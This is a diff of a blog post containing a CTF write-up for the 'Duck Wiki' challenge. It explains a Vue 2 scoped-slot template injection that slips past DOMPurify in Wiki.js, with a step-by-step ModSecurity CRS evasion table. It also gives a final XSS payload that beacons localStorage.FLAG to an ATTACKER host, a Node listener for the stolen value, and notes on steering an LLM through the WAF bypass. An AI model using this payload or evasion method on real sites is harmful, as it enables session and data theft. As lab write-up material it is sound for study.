@@ -7,7 +7,7 @@
     <meta name="color-scheme" content="dark">
 
     <title>Duck Wiki — LazyBlog</title>
-    <meta name="description" content="Stored XSS in a Wiki.js page via a Vue 2 scoped-slot destructuring-default SSTI primitive, smuggled past DOMPurify&apos;s &lt;tabset&gt; allowlist and a ModSecurity CRS proxy to exfiltrate localStorage.FLAG from the bot.">
+    <meta name="description" content="Stored XSS in Wiki.js via a Vue scoped-slot destructuring-default SSTI, chained with an incremental ModSecurity CRS bypass to exfiltrate the bot&apos;s localStorage flag.">
             <meta name="author" content="tungdlm99">
         <meta name="generator" content="LazyBlog 1.11.0">
     <meta name="robots" content="index, follow, max-image-preview:large">
@@ -16,7 +16,7 @@
 
     <!-- Open Graph -->
     <meta property="og:title" content="Duck Wiki">
-    <meta property="og:description" content="Stored XSS in a Wiki.js page via a Vue 2 scoped-slot destructuring-default SSTI primitive, smuggled past DOMPurify&apos;s &lt;tabset&gt; allowlist and a ModSecurity CRS proxy to exfiltrate localStorage.FLAG from the bot.">
+    <meta property="og:description" content="Stored XSS in Wiki.js via a Vue scoped-slot destructuring-default SSTI, chained with an incremental ModSecurity CRS bypass to exfiltrate the bot&apos;s localStorage flag.">
     <meta property="og:url" content="https://doantung99.github.io/blog/posts/duck-wiki">
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="LazyBlog">
@@ -31,7 +31,7 @@
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Duck Wiki">
-    <meta name="twitter:description" content="Stored XSS in a Wiki.js page via a Vue 2 scoped-slot destructuring-default SSTI primitive, smuggled past DOMPurify&apos;s &lt;tabset&gt; allowlist and a ModSecurity CRS proxy to exfiltrate localStorage.FLAG from the bot.">
+    <meta name="twitter:description" content="Stored XSS in Wiki.js via a Vue scoped-slot destructuring-default SSTI, chained with an incremental ModSecurity CRS bypass to exfiltrate the bot&apos;s localStorage flag.">
         
     <!-- Alternates: machine-readable / AI / RSS -->
             <link rel="alternate" type="text/markdown" href="https://doantung99.github.io/blog/posts/duck-wiki.md">
@@ -41,7 +41,7 @@
     <!-- Favicon -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2032%2032%22%3E%3Crect%20width%3D%2232%22%20height%3D%2232%22%20fill%3D%22%230a0e0a%22%2F%3E%3Ctext%20x%3D%224%22%20y%3D%2224%22%20font-family%3D%22monospace%22%20font-size%3D%2222%22%20fill%3D%22%2339ff14%22%3E%26gt%3B_%3C%2Ftext%3E%3C%2Fsvg%3E">
 
-            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Duck Wiki","description":"Stored XSS in a Wiki.js page via a Vue 2 scoped-slot destructuring-default SSTI primitive, smuggled past DOMPurify\u0027s \u003Ctabset\u003E allowlist and a ModSecurity CRS proxy to exfiltrate localStorage.FLAG from the bot.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/duck-wiki","mainEntityOfPage":"https://doantung99.github.io/blog/posts/duck-wiki","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, web, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
+            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Duck Wiki","description":"Stored XSS in Wiki.js via a Vue scoped-slot destructuring-default SSTI, chained with an incremental ModSecurity CRS bypass to exfiltrate the bot\u0027s localStorage flag.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/duck-wiki","mainEntityOfPage":"https://doantung99.github.io/blog/posts/duck-wiki","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, web, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
     
     <script>
     // Theme bootstrap — server already rendered the configured default on
@@ -74,7 +74,7 @@
 </div>
 
 <header>
-            <div class="callsign">XV5HP // MAYLAB // HẢI PHÒNG</div>
+            <div class="callsign">NAB // Hà Nội</div>
                     <p class="site-brand"><a href="/blog/" class="brand-link">LazyBlog</a></p>
                 <div class="subtitle">// A personal blog transmitting thoughts over imperfect radio waves. Expect noise, fading, and low bandwidth—but always authentic signals.</div>
         <div class="header-actions">
@@ -112,26 +112,165 @@
     
             <nav class="toc toc-inline" aria-label="Table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#mapping-the-target-before-writing-a-single-payload">Mapping the target before writing a single payload</a></li><li class="level-3"><a href="#why-dompurify-doesn-t-save-wiki-js-here">Why DOMPurify doesn&#039;t save Wiki.js here</a></li><li class="level-3"><a href="#the-exec-primitive-scoped-slot-destructuring-defaults">The exec primitive: scoped-slot destructuring defaults</a></li><li class="level-3"><a href="#what-evil-has-to-do-and-the-crs-constraints-on-it">What EVIL has to do, and the CRS constraints on it</a></li><li class="level-3"><a href="#the-final-payload">The final payload</a></li><li class="level-3"><a href="#end-to-end-from-challenge-data-to-printed-flag">End-to-end: from challenge data to printed flag</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     
     <div class="post-body">
         <h2 id="summary">Summary</h2>
-<p>A Wiki.js v2 instance lets you submit HTML that a Puppeteer bot renders while logged in, with the flag sitting in <code>localStorage.FLAG</code>. The bug is a Vue 2 client-side template injection: DOMPurify allowlists <code>&lt;tabset&gt;</code> and <code>v-slot</code> for a legit feature, and a scoped-slot destructuring default turns that into arbitrary JS, which then has to be rewritten construct-by-construct to score 0 against a ModSecurity CRS proxy.</p>
+<p>Duck Wiki is a Wiki.js v2 instance (&quot;Wikipedia for duck&quot;) fronted by an OWASP ModSecurity CRS proxy and visited by a Puppeteer bot that holds the flag in <code>localStorage.FLAG</code>. The intended bug is a <strong>client-side template injection in Vue 2</strong>: DOMPurify allowlists <code>&lt;tabset&gt;</code> and <code>v-slot:*</code> to support Wiki.js's tabs feature, but a <strong>destructuring default in a scoped-slot binding</strong> (<code>v-slot:content=&quot;{x=EVIL}&quot;</code>) executes arbitrary JS because the slot is invoked with an empty props object. The rest of the challenge is steering a payload past CRS 4.27 at PL1 one matched rule at a time until the anomaly score is zero, then having the bot's session beacon the flag to an attacker host.</p>
+<p>I'll be honest about how this one got solved: an LLM did almost all of the grinding — it knew the Vue scoped-slot trick existed, it wrote the harness, and it iterated the WAF bypass against the audit log far faster than I would have by hand. My job was recognition (this is a <em>Vue runtime-compiler</em> DOMPurify bypass, not a generic XSS), judgment (rejecting its first few &quot;clever&quot; payloads that were never going to fire), and verification (actually watching the beacon land). This writeup is deep on the technique <em>and</em> deliberate about which prompts moved the needle.</p>
 <h2 id="solution">Solution</h2>
-<p>I went in reading this as a client-side template injection problem, not a classic reflected XSS one: Wiki.js mounts page content with the full Vue build (runtime compiler, <code>unsafe-eval</code>, no CSP), so the real question was which sanitizer-approved attribute Vue would still treat as code. I had the model triage the <code>html-security</code> config and it surfaced the giveaway: DOMPurify 2.4.3 with <code>ADD_TAGS: [tabset, template]</code> and <code>ADD_ATTR: [v-pre, v-slot:tabs, v-slot:content, target]</code>. The <code>v-pre</code> guard only neutralizes <code>{{ }}</code> in text nodes; it does nothing about <code>v-slot</code>.</p>
-<p>My direction here was the key insight, and I had the model confirm the mechanics: <code>&lt;tabset&gt;</code> renders <code>&lt;slot name=&quot;content&quot;&gt;</code> and calls the scoped-slot function with <code>{}</code>, so a <strong>destructuring default</strong> in the slot binding executes. I caught one wrong turn early - the model first tried a single-param default, which never fires because props is always empty; it has to be object destructuring with a default, <code>function ({x = EVIL}) {}</code>, so the default expression runs.</p>
-<p>That gave a clean primitive:</p>
+<h3 id="mapping-the-target-before-writing-a-single-payload">Mapping the target before writing a single payload</h3>
+<p>The deployment is three containers:</p>
+<ul>
+<li><code>ghcr.io/requarks/wiki:2</code> — Wiki.js v2, the app.</li>
+<li>An <code>owasp/modsecurity-crs:nginx</code> proxy — CRS <strong>4.27, Paranoia Level 1</strong>, sitting in front.</li>
+<li>A Puppeteer XSS bot — logs in as the <em>assistant</em> account (JWT cookie), takes attacker HTML, creates a <code>bot/&lt;slug&gt;</code> page with <code>editor: &quot;code&quot;</code>, and visits it.</li>
+</ul>
+<p>The flag is not in the database or a file. It lives in the <strong>bot browser's <code>localStorage</code></strong>, under key <code>FLAG</code>, on the <code>app.local:3000</code> origin, set by the bot before it navigates to our page. The remote only exposes the bot-submission form: <code>POST html=</code> (urlencoded), routed through the CRS proxy. There is no admin panel for us, no file read, no SSRF target. So the whole challenge collapses to one sentence:</p>
+<blockquote>
+<p>Get JavaScript to run in the bot's authenticated session, read <code>localStorage.FLAG</code>, and send it somewhere I control — and get that payload through CRS with a final anomaly score of 0.</p>
+</blockquote>
+<p>Two sub-problems, and they fight each other: the cleaner the JS, the harder it is to make it execute through DOMPurify; the more powerful the JS, the more CRS rules it trips. The art is the intersection.</p>
+<h3 id="why-dompurify-doesn-t-save-wiki-js-here">Why DOMPurify doesn't save Wiki.js here</h3>
+<p>Wiki.js renders page body content into <code>#root</code>, and <code>#root</code> is mounted by the <strong>full Vue 2 build</strong> — the one that ships the runtime <em>template compiler</em>. That single fact is the foundation of the whole bug:</p>
+<ul>
+<li>The full build means Vue will compile template strings at runtime, so the page's HTML directives (<code>v-slot</code>, <code>v-pre</code>, <code>v-if</code>, …) are <em>live</em>, not inert markup.</li>
+<li>The runtime compiler requires <code>unsafe-eval</code>, and there is <strong>no CSP</strong> on this origin, so <code>eval</code>/<code>Function</code> are available — which matters for how we think about exec.</li>
+</ul>
+<p>Between attacker input and the DOM sits the <code>html-security</code> layer running <strong>DOMPurify 2.4.3</strong>. By default DOMPurify would strip everything dangerous. But Wiki.js needs its legitimate <code>&lt;tabset&gt;</code> tabs component to survive sanitization, so it widens the allowlist:</p>
+<pre><code class="language-text">ADD_TAGS: [tabset, template]
+ADD_ATTR: [v-pre, v-slot:tabs, v-slot:content, target]
+</code></pre>
+<p>This is the entire vulnerability. DOMPurify is a <em>DOM</em> sanitizer — it reasons about tags and attributes, not about what Vue will later <em>do</em> with those attributes. By allowlisting <code>&lt;tabset&gt;</code>, <code>&lt;template&gt;</code>, and <code>v-slot:content</code>, the app hands Vue exactly the ingredients it needs to compile and execute a scoped slot.</p>
+<p>Note the deliberate-looking defense that <em>fails</em>: <code>v-pre</code> is allowlisted, presumably to neutralize <code>{{ }}</code> interpolation. And it does — but only for <strong>text-node interpolation</strong>. <code>v-pre</code> tells Vue &quot;skip compilation for this element and its children,&quot; which kills <code>{{ }}</code> mustaches. It does <strong>nothing</strong> to a <code>v-slot</code> binding expression, because that expression is part of how the <em>parent</em> (<code>&lt;tabset&gt;</code>) compiles its scoped slot. The guard is real but aimed at the wrong primitive.</p>
+<h3 id="the-exec-primitive-scoped-slot-destructuring-defaults">The exec primitive: scoped-slot destructuring defaults</h3>
+<p>Here is the minimal trigger:</p>
 <pre><code class="language-html">&lt;tabset&gt;&lt;template v-slot:content=&quot;{x=EVIL}&quot;&gt;&lt;/template&gt;&lt;/tabset&gt;
 </code></pre>
-<p>The grind was the WAF. I put the CRS audit log on stdout and fed the matched rule IDs back to the model one round at a time, steering each rewrite while it produced the actual payloads: drop blocked call names (<code>fetch</code>/<code>eval</code>/<code>alert</code>) for an assignment via <code>new Image().src=</code>; swap <code>${}</code> interpolation for <code>+</code> concatenation; use backtick strings and a protocol-relative <code>//host</code> to dodge libinjection/SQL rules; and append a trailing param after <code>}</code> so the brace never sits next to a closing quote. Anomaly score hit 0.</p>
-<p>The end-to-end payload - point <code>ATTACKER</code> at a listener you control (e.g. webhook.site), submit through the form, then read the captured path:</p>
+<p>Why this works, step by step:</p>
+<ol>
+<li><code>&lt;tabset&gt;</code> is a real Wiki.js component. Internally it renders <code>&lt;slot name=&quot;content&quot;&gt;</code>, i.e. it <em>invokes</em> the content slot.</li>
+<li>A scoped slot is compiled to a <strong>function</strong> whose single parameter is the slot props object. The binding <code>v-slot:content=&quot;{x=EVIL}&quot;</code> becomes, roughly, <code>function ({x = EVIL}) { /* render */ }</code>.</li>
+<li><code>&lt;tabset&gt;</code> calls that function with the slot props. Crucially, for the <code>content</code> slot it passes <strong><code>{}</code></strong> (an empty object) — no <code>x</code> key.</li>
+<li>In JS, a destructuring <strong>default</strong> fires precisely when the property is missing. <code>({x = EVIL}) =&gt; {}</code> invoked with <code>{}</code> means <code>x</code> is <code>undefined</code>, so the default expression <code>EVIL</code> is <strong>evaluated</strong>. That evaluation is arbitrary code execution.</li>
+</ol>
+<p>This is the part that's easy to get subtly wrong, and it's where I had to overrule the model's first instincts (more on that in the Lessons section). The shape matters:</p>
+<ul>
+<li><strong>Object destructuring with a default</strong> (<code>{x=EVIL}</code>) fires, because the prop is missing from <code>{}</code>. ✅</li>
+<li>A <strong>plain single-param default</strong> like <code>v-slot:content=&quot;props=EVIL&quot;</code> does <strong>not</strong> fire — the slot is always called <em>with</em> an argument (<code>{}</code>), so <code>props</code> is <code>{}</code>, not <code>undefined</code>; the default never triggers. ❌</li>
+<li><strong>Array destructuring</strong> (<code>[x=EVIL]</code>) does <strong>not</strong> fire either — props is an object, not an iterable, so the array default never engages. ❌</li>
+</ul>
+<p>So the reliable primitive is specifically: <em>object destructuring, default value, against an empty props object.</em> <code>EVIL</code> runs exactly once, at compile/render time, in the bot's origin and session.</p>
+<h3 id="what-evil-has-to-do-and-the-crs-constraints-on-it">What <code>EVIL</code> has to do, and the CRS constraints on it</h3>
+<p><code>EVIL</code> needs to read <code>localStorage.FLAG</code> and beacon it out. The naive version is trivial JS:</p>
+<pre><code class="language-js">fetch('https://ATTACKER/'+localStorage.FLAG)
+</code></pre>
+<p>…and it's also a CRS piñata. The submission goes <code>POST html=&lt;payload&gt;</code> through CRS 4.27 PL1, and the goal is <strong>total anomaly score 0</strong> (the proxy blocks at the default threshold). The way you actually do this is not to guess — you enable the audit log, submit, read which rule IDs matched, rewrite <em>one construct</em>, and repeat. The local <code>docker-compose.override.yml</code> turns on the CRS audit log to stdout so <code>docker compose logs proxy</code> prints the matched IDs.</p>
+<p>Here is the bypass, rule by rule, which is the real meat of the challenge:</p>
+<table>
+<thead>
+<tr>
+<th>What tripped it</th>
+<th>Rule(s)</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Call names <code>fetch(</code>, <code>eval(</code>, <code>alert(</code>, …</td>
+<td>941390 (JS function-name XSS)</td>
+<td>Use <strong>assignment, no listed call name</strong>. <code>new Image().src = …</code> performs a GET with no allowlisted call. <code>Image</code> and <code>encodeURIComponent</code> are not on the function-name list.</td>
+</tr>
+<tr>
+<td><code>${...}</code> template-literal interpolation</td>
+<td>932130 (unix cmd) + 933135 (php)</td>
+<td>Drop template interpolation entirely; build the URL with <strong><code>+</code> string concatenation</strong>.</td>
+</tr>
+<tr>
+<td><code>'...://...'</code> — quoted string containing a protocol/<code>://</code></td>
+<td>942100 (libinjection) + 942550</td>
+<td>Use <strong>backtick</strong> strings instead of single/double quotes (backticks aren't SQL delimiters), and a <strong>protocol-relative</strong> <code>//host</code> URL so there's no <code>://</code>.</td>
+</tr>
+<tr>
+<td><code>&quot;{...}&quot;</code> — a brace sitting right next to a closing quote</td>
+<td>942550 alt</td>
+<td>Make the <code>}</code> not adjacent to the quote by <strong>appending a second slot param after it</strong>: <code>…},z</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>Each of these is a small, independent edit. The discipline is what makes it tractable: never rewrite the whole payload, only the one construct the audit log just flagged, then re-submit and re-read.</p>
+<p>Walking the transformations on the exec sink:</p>
+<ul>
+<li><code>fetch(...)</code> → <code>new Image().src = ...</code> — exfil via image GET, zero blocked call names.</li>
+<li><code>'https://ATTACKER/'+...</code> → <code>`//ATTACKER/img/`+...</code> — backtick + protocol-relative kills libinjection and the <code>://</code> heuristics.</li>
+<li><code>${localStorage.FLAG}</code> → <code>+encodeURIComponent(localStorage.FLAG)</code> — <code>+</code> concat instead of interpolation; <code>encodeURIComponent</code> makes the brace-bearing flag URL-safe and is itself not a flagged name.</li>
+<li>trailing <code>},z</code> — second destructuring param so the <code>}</code> from <code>{x=…}</code> isn't kissing the closing <code>&quot;</code>.</li>
+</ul>
+<h3 id="the-final-payload">The final payload</h3>
 <pre><code class="language-html">&lt;tabset&gt;&lt;template v-slot:content=&quot;{x=new Image().src=`//ATTACKER/img/`+encodeURIComponent(localStorage.FLAG)},z&quot;&gt;&lt;/template&gt;&lt;/tabset&gt;
 </code></pre>
-<p>Submitting it: the CRS proxy passes the form fine, but Cloudflare's bot challenge sits in front of the remote, so I did it in a real browser (or replay with a valid <code>cf_clearance</code> cookie + matching UA). The bot logs in as the assistant account, builds the <code>bot/&lt;slug&gt;</code> page from this HTML, visits it, the slot default runs in its session, and the exfil GET lands on the listener with <code>/img/v1t{...}</code> in the path. I verified the captured request matched before calling it.</p>
+<p>Reading it as code: the slot function is <code>function ({ x = (new Image().src = </code> + &quot;<code>//ATTACKER/img/</code>&quot; + <code> + encodeURIComponent(localStorage.FLAG)), z }) {}</code>. Called with <code>{}</code>, both <code>x</code> and <code>z</code> are missing; <code>x</code>'s default expression runs, which sets an <code>Image</code>'s <code>src</code> to <code>//ATTACKER/img/&lt;urlencoded flag&gt;</code>, firing the GET. <code>z</code> has no default and is harmless — it exists purely to push <code>}</code> off the quote.</p>
+<h3 id="end-to-end-from-challenge-data-to-printed-flag">End-to-end: from challenge data to printed flag</h3>
+<p>The repeatable path: stand up a listener, point <code>ATTACKER</code> at it, submit the payload through the form (locally direct, remotely through a real browser because Cloudflare's bot challenge sits in front of the CRS proxy), and read the flag out of the captured request path. This single Node script is the whole exfil side — it serves the beacon endpoint and prints the flag the instant the bot's <code>new Image()</code> request lands:</p>
+<pre><code class="language-js">// listener.mjs — run: node listener.mjs   (then expose :8000 to the bot, e.g. via a tunnel)
+// The bot's payload does: new Image().src = `//&lt;this-host&gt;/img/` + encodeURIComponent(localStorage.FLAG)
+import http from 'node:http';
+
+const PORT = 8000;
+
+http.createServer((req, res) =&gt; {
+  // Always answer fast so the Image() request completes cleanly.
+  res.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' });
+  res.end(Buffer.from('R0lGODlhAQABAAAAACw=', 'base64')); // 1x1 gif
+
+  // We expect: GET /img/&lt;urlencoded flag&gt;
+  const m = req.url.match(/^\/img\/(.+)$/);
+  if (!m) return;
+  let flag;
+  try { flag = decodeURIComponent(m[1]); } catch { flag = m[1]; }
+  console.log('[beacon] from', req.socket.remoteAddress, '-&gt;', flag);
+  if (/^v1t\{.*\}$/.test(flag)) {
+    console.log('\n========================================');
+    console.log('  FLAG:', flag);
+    console.log('========================================\n');
+  }
+}).listen(PORT, () =&gt; {
+  console.log(`listening on :${PORT}`);
+  console.log('Submit this as html= through the Duck Wiki bot form (ATTACKER = this host):\n');
+  console.log('&lt;tabset&gt;&lt;template v-slot:content=&quot;{x=new Image().src=`//ATTACKER/img/`+encodeURIComponent(localStorage.FLAG)},z&quot;&gt;&lt;/template&gt;&lt;/tabset&gt;\n');
+});
+</code></pre>
+<p>Run order:</p>
+<ol>
+<li><code>node listener.mjs</code>, then make <code>:8000</code> reachable from the bot (local: <code>host.docker.internal</code>; remote: a public tunnel such as <code>webhook.site</code> or your own VPS).</li>
+<li>Replace <code>ATTACKER</code> in the payload with that host and submit it as <code>html=</code> via the bot form. Locally you can POST straight through CRS; on the remote you submit in a <strong>real browser</strong> (or replay the request with a valid <code>cf_clearance</code> cookie + matching User-Agent), because Cloudflare's bot challenge fronts the CRS proxy.</li>
+<li>The bot creates <code>bot/&lt;slug&gt;</code>, visits it, Vue compiles the scoped slot, the destructuring default fires, <code>localStorage.FLAG</code> is read and beaconed. The listener prints it.</li>
+</ol>
+<p>The captured path is <code>/img/v1t%7Bsm4rty_w1k1_duck%7D</code>, which decodes to the flag.</p>
+<p>To prove the exec/sanitization survival <em>before</em> spending a remote submission, the local harness has two more pieces worth keeping: <code>render.mjs</code> (admin login → create the page → dump the post-DOMPurify <code>render</code> output, so you can confirm <code>&lt;tabset&gt;</code>/<code>v-slot:content</code> actually survived sanitization) and <code>verify.mjs</code> (real Chrome, assistant JWT cookie + a seeded <code>localStorage.FLAG</code>, confirms the payload executes and the beacon fires). That local loop is what makes the remote a one-shot.</p>
 <h2 id="flag">Flag</h2>
 <pre><code>v1t{sm4rty_w1k1_duck}
 </code></pre>
+<h2 id="lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</h2>
+<p>This is the section I actually care about, because the win here wasn't knowing Vue internals cold — it was driving an LLM to the answer without letting it wander. Duck Wiki is a <em>two-stage</em> puzzle (a framework-specific exec primitive, then an iterative WAF bypass), and each stage rewards a different prompting posture.</p>
+<p><strong>1. Make the model name the exact primitive, not &quot;an XSS.&quot;</strong> My first useful prompt pinned down the stack and forced specificity:</p>
+<blockquote>
+<p>&quot;Wiki.js v2 sanitizes with DOMPurify but allowlists <code>ADD_TAGS:[tabset,template]</code> and <code>ADD_ATTR:[v-pre,v-slot:tabs,v-slot:content,target]</code>, and <code>#root</code> is mounted by the full Vue 2 build with the runtime compiler and no CSP. Given that, what is the <em>minimal</em> client-side template injection? Show the exact compiled function the slot binding becomes and explain when its default expression actually runs.&quot;</p>
+</blockquote>
+<p>Forcing it to &quot;show the compiled function&quot; is what surfaced the real insight: the slot is invoked with <code>{}</code>, so only an <strong>object-destructuring default</strong> fires. Without that demand, the model happily proposed plausible-looking variants.</p>
+<p><strong>2. Tell it which dead-ends to avoid — by mechanism, not just &quot;don't.&quot;</strong> The model's early payloads tried <code>v-slot:content=&quot;props=alert(1)&quot;</code> and <code>[x=...]</code>. I corrected with the <em>reason</em>:</p>
+<blockquote>
+<p>&quot;The slot is always called with an argument (<code>{}</code>), so a single-param default like <code>props=EVIL</code> will never trigger and array destructuring won't either — props is an object, not iterable. Only <code>{x=EVIL}</code> fires. Rewrite using object-destructuring default and assume the exfil sink must avoid named calls.&quot;</p>
+</blockquote>
+<p>Giving the model the <em>mechanism</em> (always-called-with-<code>{}</code>) stopped it regenerating the same broken shapes. Generic &quot;that's wrong, try again&quot; just made it churn.</p>
+<p><strong>3. Drive the WAF bypass off the audit log, one rule at a time — never let it guess.</strong> The single most effective instruction for stage two:</p>
+<blockquote>
+<p>&quot;Here are the matched CRS rule IDs from the audit log: 941390, 932130, 942550. Do NOT rewrite the whole payload. For each ID, identify the offending construct and change only that: no allowlisted call names (so no <code>fetch</code>/<code>eval</code>/<code>alert</code> — use <code>new Image().src=</code>), <code>+</code> concat instead of <code>${}</code>, backticks + protocol-relative <code>//host</code> instead of quoted <code>://</code>, and keep <code>}</code> off the closing quote. Output the new payload and predict which IDs should now be clear.&quot;</p>
+</blockquote>
+<p>Two things made this work: feeding <strong>real rule IDs</strong> (the model is excellent at mapping a CRS ID to its trigger) and the hard constraint <strong>&quot;change only that construct.&quot;</strong> Left unconstrained, it rewrote everything each round and reintroduced rules I'd already cleared.</p>
+<p><strong>How I caught its mistakes and verified.</strong> I never trusted &quot;this should work.&quot; Three concrete checks: (a) <code>render.mjs</code> to confirm the payload <em>survived DOMPurify</em> — twice the model gave me a payload DOMPurify silently stripped, which no amount of CRS-bypassing would fix; (b) re-running the submission and re-reading <code>docker compose logs proxy</code> to confirm the anomaly score was genuinely 0, not &quot;probably fine&quot;; (c) <code>verify.mjs</code> in real Chrome with a seeded <code>localStorage.FLAG</code> to watch the beacon actually land before burning the remote one-shot. The model is fast but overconfident; the harness is the ground truth.</p>
+<p><strong>Fast-path prompt recipe for next time:</strong> <em>&quot;Identify the exact framework exec primitive (show the compiled form and when it fires), give the model the mechanism behind each dead-end so it stops regenerating them, then bypass the WAF strictly off real matched rule IDs — one construct per round — and verify every claim against a local render + audit-log + real-browser harness before trusting it.&quot;</em></p>
     </div>
 
     
@@ -153,7 +292,7 @@
     <aside class="post-toc-wrap" aria-hidden="true">
         <nav class="toc" aria-label="Floating table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#mapping-the-target-before-writing-a-single-payload">Mapping the target before writing a single payload</a></li><li class="level-3"><a href="#why-dompurify-doesn-t-save-wiki-js-here">Why DOMPurify doesn&#039;t save Wiki.js here</a></li><li class="level-3"><a href="#the-exec-primitive-scoped-slot-destructuring-defaults">The exec primitive: scoped-slot destructuring defaults</a></li><li class="level-3"><a href="#what-evil-has-to-do-and-the-crs-constraints-on-it">What EVIL has to do, and the CRS constraints on it</a></li><li class="level-3"><a href="#the-final-payload">The final payload</a></li><li class="level-3"><a href="#end-to-end-from-challenge-data-to-printed-flag">End-to-end: from challenge data to printed flag</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     </aside>
 </main>
